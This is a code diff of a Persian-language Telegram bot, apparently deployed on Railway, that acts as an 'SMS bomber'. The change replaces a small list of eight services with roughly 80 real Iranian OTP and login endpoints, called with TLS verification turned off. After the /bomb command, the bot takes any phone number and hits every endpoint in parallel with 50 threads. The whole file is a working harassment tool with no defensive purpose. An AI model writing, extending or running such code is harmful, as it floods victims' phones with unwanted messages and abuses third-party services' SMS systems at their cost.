@@ -1,369 +1,703 @@
 import os
 import telebot
 import requests
-import threading
-import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime
-import re
+import urllib3
 from flask import Flask
 
-# تنظیمات
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-MAX_THREADS = 20
-TIMEOUT = 10
-DELAY_BETWEEN_ROUNDS = 2
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# سرویس‌های SMS
-SMS_SERVICES = [
-    {
-        "name": "دیجی‌کالا",
-        "url": "https://api.digikala.com/v1/user/authenticate/",
-        "method": "POST",
-        "data": {"username": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "دیوار",
-        "url": "https://api.divar.ir/v5/auth/authenticate",
-        "method": "POST", 
-        "data": {"phone": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "بانی‌مود",
-        "url": "https://mobapi.banimode.com/api/v2/auth/request",
-        "method": "POST",
-        "data": {"phone": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "اسنپ",
-        "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
-        "method": "POST",
-        "data": {"cellphone": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "تپسی",
-        "url": "https://api.tapsi.cab/api/v2/user",
-        "method": "POST",
-        "data": {"phone": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "آپ",
-        "url": "https://api.alopeyk.com/api/v2/user/login",
-        "method": "POST",
-        "data": {"username": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "ریحون",
-        "url": "https://api.reyhoon.com/v2/user/register/check-mobile",
-        "method": "POST",
-        "data": {"mobile": ""},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "اسنپ‌فود",
-        "url": "https://snappfood.ir/auth/login",
-        "method": "POST",
-        "data": {"cellphone": ""},
-        "headers": {"Content-Type": "application/json"}
-    }
-]
-
-# دیکشنری برای ذخیره وضعیت کاربران
-user_sessions = {}
-session_lock = threading.Lock()
-
-class SMSBomber:
-    def __init__(self, phone_number, rounds=1, max_threads=MAX_THREADS):
-        self.phone = phone_number
-        self.rounds = rounds
-        self.max_threads = max_threads
-        self.success_count = 0
-        self.failed_count = 0
-        self.total_requests = 0
-        self.start_time = time.time()
-        self.lock = threading.Lock()
-        self.results = []
-        
-    def send_sms(self, service):
-        """ارسال SMS به یک سرویس"""
-        try:
-            data = service["data"].copy()
-            
-            # جایگزینی شماره تلفن
-            for key in data:
-                if data[key] == "":
-                    data[key] = self.phone
-            
-            if service["method"].upper() == "POST":
-                response = requests.post(
-                    service["url"],
-                    json=data,
-                    headers=service.get("headers", {}),
-                    timeout=TIMEOUT
-                )
-            else:
-                response = requests.get(
-                    service["url"],
-                    params=data,
-                    headers=service.get("headers", {}),
-                    timeout=TIMEOUT
-                )
-            
-            if response.status_code in [200, 201, 202, 204]:
-                with self.lock:
-                    self.success_count += 1
-                return True, service["name"], response.status_code
-            else:
-                with self.lock:
-                    self.failed_count += 1
-                return False, service["name"], response.status_code
-                
-        except Exception as e:
-            with self.lock:
-                self.failed_count += 1
-            return False, service["name"], str(e)
+SERVICES = {
+    'snapp': lambda num: requests.post(
+        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+        json={"cellphone": f"+98{num}"},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
     
-    def bomb_round(self, round_num):
-        """انجام یک دور بمباران"""
-        round_results = []
-        
-        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
-            futures = {
-                executor.submit(self.send_sms, service): service["name"] 
-                for service in SMS_SERVICES
+    'tapsi': lambda num: requests.post(
+        url="https://tap33.me/api/v2/user",
+        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+    
+    'digikala': lambda num: requests.post(
+        url="https://api.digikala.com/v1/user/authenticate/",
+        json={"username": f"0{num}"},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+    
+    'divar': lambda num: requests.post(
+        url="https://api.divar.ir/v5/auth/authenticate",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'snappfood': lambda num: requests.post(
+        url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
+        json={"cellphone": f"0{num}"},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'alibaba': lambda num: requests.post(
+        url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
+        json={"phoneNumber": f"0{num}"},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'banimod': lambda num: requests.post(
+        url="https://mobapi.banimode.com/api/v2/auth/request",
+        json={"phone": f"0{num}"},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'bit24': lambda num: requests.post(
+        url="https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
+        json={"mobile": f"0{num}", "country_code": "98"},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'rubika': lambda num: requests.post(
+        url="https://messengerg2c4.iranlms.ir/",
+        json={
+            "api_version": "3",
+            "method": "sendCode",
+            "data": {
+                "phone_number": num,
+                "send_type": "SMS"
             }
-            
-            for future in as_completed(futures):
-                success, service_name, status = future.result()
-                self.total_requests += 1
-                
-                result_msg = f"{'✅' if success else '❌'} {service_name} - {'موفق' if success else 'خطا'}: {status}"
-                round_results.append(result_msg)
-                
-        return round_results
-    
-    def start_bombing(self):
-        """شروع عملیات بمباران"""
-        all_results = []
-        
-        for round_num in range(1, self.rounds + 1):
-            round_results = self.bomb_round(round_num)
-            all_results.extend(round_results)
-            
-            if round_num < self.rounds:
-                time.sleep(DELAY_BETWEEN_ROUNDS)
-        
-        return all_results
+        },
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
 
-def validate_phone(phone):
-    """اعتبارسنجی شماره تلفن"""
-    phone = ''.join(filter(str.isdigit, phone))
-    
-    if len(phone) == 10 and phone.startswith('9'):
-        return '0' + phone
-    elif len(phone) == 11 and phone.startswith('09'):
-        return phone
-    return None
+    'drto': lambda num: requests.get(
+        url="https://api.doctoreto.com/api/web/patient/v1/accounts/register",
+        params={"mobile": num, "captcha": "", "country_id": 205},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
 
-# دستورات ربات
+    '3tex': lambda num: requests.post(
+        url="https://3tex.io/api/1/users/validation/mobile",
+        json={"receptorPhone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'deniizshop': lambda num: requests.post(
+        url="https://deniizshop.com/api/v1/sessions/login_request",
+        json={"mobile_phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'behtarino': lambda num: requests.post(
+        url="https://bck.behtarino.com/api/v1/users/phone_verification/",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'azki': lambda num: requests.get(
+        url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={num}",
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'pooleno': lambda num: requests.post(
+        url="https://api.pooleno.ir/v1/auth/check-mobile",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'bama': lambda num: requests.post(
+        url="https://bama.ir/signin-checkforcellnumber",
+        data=f"cellNumber={num}",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        timeout=5,
+        verify=False
+    ),
+
+    'bitbarg': lambda num: requests.post(
+        url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'bitpin': lambda num: requests.post(
+        url="https://api.bitpin.ir/v1/usr/sub_phone/",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'chamedoon': lambda num: requests.post(
+        url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'kilid': lambda num: requests.get(
+        url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
+        params={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'shab': lambda num: requests.post(
+        url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'itoll': lambda num: requests.post(
+        url="https://app.itoll.ir/api/v1/auth/login",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'namava': lambda num: requests.post(
+        url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
+        json={"UserName": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'sheypoor': lambda num: requests.post(
+        url="https://www.sheypoor.com/auth",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'snapp_ir': lambda num: requests.post(
+        url="https://api.snapp.ir/api/v1/sms/link",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'nobat': lambda num: requests.post(
+        url="https://nobat.ir/api/public/patient/login/phone",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'buskool': lambda num: requests.post(
+        url="https://www.buskool.com/send_verification_code",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'simkhan': lambda num: requests.post(
+        url="https://www.simkhanapi.ir/api/users/registerV2",
+        json={"mobileNumber": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'hiword': lambda num: requests.post(
+        url="https://hiword.ir/wp-json/otp-login/v1/login",
+        json={"identifier": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'bit24cash': lambda num: requests.post(
+        url="https://api.bit24.cash/api/v3/auth/check-mobile",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'tikban': lambda num: requests.post(
+        url="https://tikban.com/Account/LoginAndRegister",
+        json={"CellPhone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'digistyle': lambda num: requests.post(
+        url="https://www.digistyle.com/users/login-register/",
+        json={"loginRegister[email_phone]": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'iranketab': lambda num: requests.post(
+        url="https://www.iranketab.ir/account/register",
+        json={"UserName": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'ketabchi': lambda num: requests.post(
+        url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
+        json={"phoneNumber": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'offdecor': lambda num: requests.post(
+        url="https://www.offdecor.com/index.php?route=account/login/sendCode",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'exo': lambda num: requests.post(
+        url="https://exo.ir/index.php?route=account/mobile_login",
+        json={"mobile_number": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'khanoumi': lambda num: requests.post(
+        url="https://www.khanoumi.com/accounts/sendotp",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'rojashop': lambda num: requests.post(
+        url="https://rojashop.com/api/auth/sendOtp",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'dadpardaz': lambda num: requests.post(
+        url="https://dadpardaz.com/advice/getLoginConfirmationCode",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'mashinbank': lambda num: requests.post(
+        url="https://mashinbank.com/api2/users/check",
+        json={"mobileNumber": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'pezeshket': lambda num: requests.post(
+        url="https://api.pezeshket.com/core/v1/auth/requestCode",
+        json={"mobileNumber": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'virgool': lambda num: requests.post(
+        url="https://virgool.io/api/v1.4/auth/verify",
+        json={"method": "phone", "identifier": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'timcheh': lambda num: requests.post(
+        url="https://api.timcheh.com/auth/otp/send",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'paklean': lambda num: requests.post(
+        url="https://client.api.paklean.com/user/resendCode",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'mobogift': lambda num: requests.post(
+        url="https://mobogift.com/signin",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'iranicard': lambda num: requests.post(
+        url="https://api.iranicard.ir/api/v1/register",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'cinematicket': lambda num: requests.post(
+        url="https://cinematicket.org/api/v1/users/signup",
+        json={"phone_number": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'irantic': lambda num: requests.post(
+        url="https://www.irantic.com/api/login/request",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'kafegheymat': lambda num: requests.post(
+        url="https://kafegheymat.com/shop/getLoginSms",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'snappexpress': lambda num: requests.post(
+        url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
+        json={"cellphone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'delino': lambda num: requests.post(
+        url="https://www.delino.com/user/register",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'alopeyk': lambda num: requests.post(
+        url="https://alopeyk.com/api/sms/send.php",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'digikalajet': lambda num: requests.post(
+        url="https://api.digikalajet.ir/user/login-register/",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'melix': lambda num: requests.post(
+        url="https://melix.shop/site/api/v1/user/otp",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'dastkhat': lambda num: requests.post(
+        url="https://dastkhat-isad.ir/api/v1/user/store",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'sibbank': lambda num: requests.post(
+        url="https://api.sibbank.ir/v1/auth/login",
+        json={"phone_number": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'miare': lambda num: requests.post(
+        url="https://www.miare.ir/api/otp/driver/request/",
+        json={"phone_number": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'arshiyan': lambda num: requests.post(
+        url="https://api.arshiyan.com/send_code",
+        json={"country_code": "98", "phone_number": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'alopeyk_safir': lambda num: requests.post(
+        url="https://api.alopeyk.com/safir-service/api/v1/login",
+        json={"phone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'dadhesab': lambda num: requests.post(
+        url="https://api.dadhesab.ir/user/entry",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'dosma': lambda num: requests.post(
+        url="https://app.dosma.ir/sendverify/",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'ehteraman': lambda num: requests.post(
+        url="https://api.ehteraman.com/api/request/otp",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'mci': lambda num: requests.post(
+        url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",
+        json={"msisdn": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'hbbs': lambda num: requests.post(
+        url="https://api.hbbs.ir/authentication/SendCode",
+        json={"MobileNumber": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'kcd': lambda num: requests.post(
+        url="https://api.kcd.app/api/v1/auth/login",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'ostadkr': lambda num: requests.post(
+        url="https://api.ostadkr.com/login",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'rayshomar': lambda num: requests.post(
+        url="https://api.rayshomar.ir/api/Register/RegistrMobile",
+        json={"MobileNumber": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'snapp_digital': lambda num: requests.post(
+        url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
+        json={"cellphone": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'offch': lambda num: requests.post(
+        url="https://api.offch.com/auth/otp",
+        json={"username": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'watchonline': lambda num: requests.post(
+        url="https://api.watchonline.shop/api/v1/otp/request",
+        json={"mobile": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'shadmessenger': lambda num: requests.post(
+        url="https://shadmessenger12.iranlms.ir/",
+        json={
+            "api_version": "3",
+            "method": "sendCode",
+            "data": {
+                "phone_number": num,
+                "send_type": "SMS"
+            }
+        },
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'snappmarket': lambda num: requests.get(
+        url=f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={num}",
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'mrbilit': lambda num: requests.get(
+        url=f"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={num}&source=2&sendTokenIfNot=true",
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'filmnet': lambda num: requests.get(
+        url=f"https://api-v2.filmnet.ir/access-token/users/{num}/otp",
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'torob': lambda num: requests.get(
+        url=f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'gapim': lambda num: requests.get(
+        url=f"https://core.gap.im/v1/user/add.json?mobile=%2B{num}",
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    ),
+
+    'mydigipay': lambda num: requests.post(
+        url="https://app.mydigipay.com/digipay/api/users/send-sms",
+        json={"cellNumber": num},
+        headers={"Content-Type": "application/json"},
+        timeout=5,
+        verify=False
+    )
+}
+
+user_sessions = {}
+
 @bot.message_handler(commands=['start'])
-def send_welcome(message):
-    welcome_text = """
-💣 SMS Bomber v2.0
-
-📋 دستورات:
-/bomb - شروع بمباران
-/stats - آمار سرویس‌ها
-/help - راهنما
-
-⚠️ استفاده مسئولانه
-    """
-    bot.reply_to(message, welcome_text)
-
-@bot.message_handler(commands=['help'])
-def show_help(message):
-    help_text = f"""
-📖 راهنمای استفاده:
-
-1. برای شروع:
-   /bomb
-
-2. تعداد سرویس‌ها: {len(SMS_SERVICES)}
-   
-3. تنظیمات:
-   - حداکثر ترد: {MAX_THREADS}
-   - تایم‌اوت: {TIMEOUT} ثانیه
-   - تاخیر بین دورها: {DELAY_BETWEEN_ROUNDS} ثانیه
-    """
-    bot.send_message(message.chat.id, help_text)
-
-@bot.message_handler(commands=['stats'])
-def show_stats(message):
-    stats_text = f"""
-📊 آمار ربات:
-
-• سرویس‌های فعال: {len(SMS_SERVICES)}
-• کاربران آنلاین: {len(user_sessions)}
-• وضعیت: فعال ✅
-• محیط: Railway 🚄
-    """
-    bot.send_message(message.chat.id, stats_text)
+def start(message):
+    bot.send_message(message.chat.id, "به ربات دکتر ارور خوش اومدید")
 
 @bot.message_handler(commands=['bomb'])
-def start_bomb_process(message):
-    chat_id = message.chat.id
-    
-    with session_lock:
-        user_sessions[chat_id] = {"step": "waiting_phone"}
-    
-    bot.send_message(
-        chat_id,
-        "📱 شماره موبایل را وارد کنید:\n\n"
-        "مثال: 09123456789\n\n"
-        "❌ برای لغو: /cancel"
-    )
-
-@bot.message_handler(commands=['cancel'])
-def cancel_operation(message):
-    chat_id = message.chat.id
-    with session_lock:
-        if chat_id in user_sessions:
-            del user_sessions[chat_id]
-    bot.send_message(chat_id, "❌ عملیات لغو شد.")
+def bomb(message):
+    user_sessions[message.chat.id] = "waiting_phone"
+    bot.send_message(message.chat.id, "شماره:")
 
 @bot.message_handler(func=lambda message: True)
-def handle_messages(message):
+def handle_message(message):
     chat_id = message.chat.id
     
-    with session_lock:
-        if chat_id not in user_sessions:
-            return
-        user_data = user_sessions[chat_id]
-    
-    if user_data.get("step") == "waiting_phone":
+    if chat_id in user_sessions and user_sessions[chat_id] == "waiting_phone":
         phone = message.text.strip()
-        validated_phone = validate_phone(phone)
+        user_sessions[chat_id] = "processing"
         
-        if not validated_phone:
-            bot.send_message(
-                chat_id,
-                "❌ شماره نامعتبر!\nلطفا دوباره وارد کنید:\nمثال: 09123456789"
-            )
-            return
+        progress_msg = bot.send_message(chat_id, "در حال ارسال...")
         
-        user_data["step"] = "waiting_rounds"
-        user_data["phone"] = validated_phone
+        success = 0
+        failed = 0
         
-        bot.send_message(
-            chat_id,
-            "🔁 تعداد دورهای ارسال (1-3):\n\n"
-            "مثال: 1\n\n"
-            "❌ برای لغو: /cancel"
-        )
-    
-    elif user_data.get("step") == "waiting_rounds":
-        try:
-            rounds = int(message.text.strip())
-            if rounds < 1 or rounds > 3:
-                bot.send_message(
-                    chat_id,
-                    "❌ تعداد دور باید بین 1-3 باشد!"
-                )
-                return
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = {executor.submit(service, phone): name for name, service in SERVICES.items()}
             
-            # شروع عملیات
-            phone = user_data["phone"]
-            
-            progress_msg = bot.send_message(
-                chat_id,
-                f"🚀 شروع بمباران...\n\n"
-                f"📞 شماره: {phone}\n"
-                f"🔁 دورها: {rounds}\n"
-                f"📡 سرویس‌ها: {len(SMS_SERVICES)}\n\n"
-                f"⏳ لطفا صبر کنید..."
-            )
-            
-            def execute_bomb():
+            for future in as_completed(futures):
+                name = futures[future]
                 try:
-                    bomber = SMSBomber(phone, rounds)
-                    results = bomber.start_bombing()
-                    
-                    # نمایش نتایج
-                    result_text = f"📊 نتایج بمباران برای {phone}:\n\n"
-                    
-                    # نمایش 10 نتیجه اول
-                    for result in results[:10]:
-                        result_text += f"{result}\n"
-                    
-                    if len(results) > 10:
-                        result_text += f"\n... و {len(results) - 10} نتیجه دیگر\n"
-                    
-                    result_text += f"\n📈 جمع‌بندی:\n"
-                    result_text += f"✅ موفق: {bomber.success_count}\n"
-                    result_text += f"❌ ناموفق: {bomber.failed_count}\n"
-                    result_text += f"📊 مجموع: {bomber.total_requests}\n"
-                    result_text += f"⏱️ زمان: {time.time() - bomber.start_time:.1f}ثانیه"
-                    
-                    bot.edit_message_text(
-                        result_text,
-                        chat_id=chat_id,
-                        message_id=progress_msg.message_id
-                    )
-                    
-                except Exception as e:
-                    bot.edit_message_text(
-                        f"❌ خطا: {str(e)}",
-                        chat_id=chat_id,
-                        message_id=progress_msg.message_id
-                    )
-                finally:
-                    with session_lock:
-                        if chat_id in user_sessions:
-                            del user_sessions[chat_id]
-            
-            thread = threading.Thread(target=execute_bomb)
-            thread.daemon = True
-            thread.start()
-            
-        except ValueError:
-            bot.send_message(chat_id, "❌ لطفا عدد وارد کنید!")
+                    response = future.result()
+                    if response.status_code in [200, 201, 202, 204]:
+                        success += 1
+                    else:
+                        failed += 1
+                except:
+                    failed += 1
+        
+        bot.edit_message_text(
+            f"ارسال شد\nموفق: {success}\nناموفق: {failed}",
+            chat_id=chat_id,
+            message_id=progress_msg.message_id
+        )
+        
+        del user_sessions[chat_id]
 
-# Routes برای Railway
 @app.route('/')
 def home():
-    return "💣 SMS Bomber Bot is Running!"
+    return "Bot is running"
 
 @app.route('/health')
 def health():
-    return {
-        "status": "healthy", 
-        "services": len(SMS_SERVICES),
-        "active_users": len(user_sessions)
-    }
+    return "OK"
 
 def run_flask():
     app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))
 
-# راه‌اندازی
 if __name__ == "__main__":
-    print("💣 SMS Bomber Bot Started!")
-    print(f"📡 Services: {len(SMS_SERVICES)}")
-    
-    # اجرای Flask در thread جداگانه
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    import threading
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
     flask_thread.start()
     
-    # اجرای ربات
-    try:
-        bot.infinity_polling(timeout=60, long_polling_timeout=60)
-    except Exception as e:
-        print(f"❌ Bot Error: {e}")
+    bot.infinity_polling()
